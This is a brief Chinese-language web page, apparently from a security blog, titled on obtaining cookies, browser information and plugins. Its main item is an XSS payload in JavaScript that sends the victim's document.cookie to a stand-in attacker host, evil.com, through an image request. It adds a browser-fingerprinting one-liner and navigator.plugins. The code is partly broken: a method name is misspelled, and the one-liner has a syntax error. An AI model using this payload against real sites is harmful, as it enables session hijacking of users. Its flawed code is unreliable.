---
layout: default
---
# ![](../img/hj.jpg)获取cookie+浏览器信息+插件


## ![](../img/github4.png)获取cookie
获取cookie的远程js（供xss调用）：
```js
var img=document.creatElement("img");
img.src="http://www.evil.com/log?"+escape(document.cookie);
document.body.appendChild(img);
```
## ![](../img/github5.png)获取浏览器信息
#### 方法1：
navigator.userAgent
#### 方法2（根据各浏览器间的差异构造一行代码）：
```js
browser=(function x(){})[-5]=='x'?'FF3':(function x(){})[-6]=='x'?'FF2':/a/[-1]=='a'?'FF';'\v'=='v'?'IE':/a/.__proto__=='//'?'Saf':/s/.test(/a/.toString)?'Chr':/^function\(/.test([].sort)?'OP':'Unknown'
```
## ![](../img/github6.png)获取插件
navigator.plugins

__原创文章，转载请注明转载自[http://www.8pwn.com](http://www.8pwn.com)__

[返回上一层](./web)
